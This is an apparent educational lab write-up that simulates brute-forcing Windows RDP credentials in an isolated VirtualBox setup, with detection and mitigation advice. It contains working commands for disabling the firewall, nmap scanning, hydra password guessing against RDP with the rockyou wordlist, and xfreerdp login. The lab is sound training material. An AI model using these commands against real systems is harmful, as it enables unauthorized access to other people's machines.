# Simulated RDP Brute Force Attack on Windows (Ethical Lab)

## Disclaimer
> This project is for **educational and research purposes only**. All testing was done in an **isolated lab environment** on virtual machines I own. Never attempt this on networks or systems you do not have explicit permission to test.

---

## 1. Project Objective

To simulate how an attacker could gain unauthorized access to a Windows machine via Remote Desktop Protocol (RDP) by brute-forcing weak credentials — and document how such attempts can be detected and prevented.

---

## 2. Lab Setup

| Component     | Tool Used          | Specs                      |
|--------------|--------------------|----------------------------|
| Host OS      | Windows/Linux/macOS| Runs VirtualBox or VMware |
| Attacker VM  | Kali Linux         | With `hydra`, `nmap`       |
| Target VM    | Windows 10         | RDP enabled, weak password |
| Network Mode | Host-Only Adapter  | No external network access |

---

## 3. Steps to Set Up

### Windows VM (Target) Setup
1. Install Windows 10 in VirtualBox/VMware.
2. Create a **local account** named `Administrator` with a **weak password** (e.g., `123456`).
3. Enable Remote Desktop:
   - **System Properties > Remote > Enable Remote Desktop**
4. Get IP with:
   ```cmd
   ipconfig
   ```
5. Turn off Firewall (for testing only):
   ```cmd
   netsh advfirewall set allprofiles state off
   ```

### Kali Linux (Attacker) Setup
1. Boot Kali.
2. Install tools:
   ```bash
   sudo apt update
   sudo apt install hydra nmap xfreerdp
   ```
3. Ping Windows IP to verify connectivity:
   ```bash
   ping <windows_ip>
   ```

---

## 4. Scanning the Target

Use Nmap to confirm the RDP port is open:
```bash
nmap -p 3389 <windows_ip>
```

---

## 5. Brute-Force RDP Credentials with Hydra

Use a common wordlist (like rockyou):
```bash
hydra -t 4 -V -f -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://<windows_ip>
```

If successful, Hydra will show:
```
[3389][rdp] host: 192.168.56.101   login: Administrator   password: 123456
```

---

## 6. Gaining Access via RDP

Use the credentials with:
```bash
xfreerdp /u:Administrator /p:123456 /v:<windows_ip>
```

This opens a remote desktop session with Administrator access.

---

## 7. Detection (On Windows VM)

Open Event Viewer and monitor:
- `Windows Logs > Security`
- `Applications and Services Logs > Microsoft > Windows > TerminalServices-RemoteConnectionManager`

Look for:
- Multiple failed login attempts.
- Successful login events.

---

## 8. Mitigations

- Enforce strong passwords.
- Set account lockout policy.
- Enable IP-based RDP restrictions.
- Use Multi-Factor Authentication.
- Actively monitor Event Logs.

---

## 9. Conclusion

This project demonstrates how weak credentials can be brute-forced on exposed RDP services. It emphasizes the need for secure configurations, logging, and proactive monitoring to prevent unauthorized access.

---

## .gitignore

```
*.log
*.pcap
*.cap
*.pyc
__pycache__/
*.vbox
*.vbox-prev
*.vdi
*.ova
*.ovf
.DS_Store
.idea/
.env
output/
```

This `.gitignore` file helps exclude VM images, logs, wordlists, and other large or sensitive files from your GitHub repository.

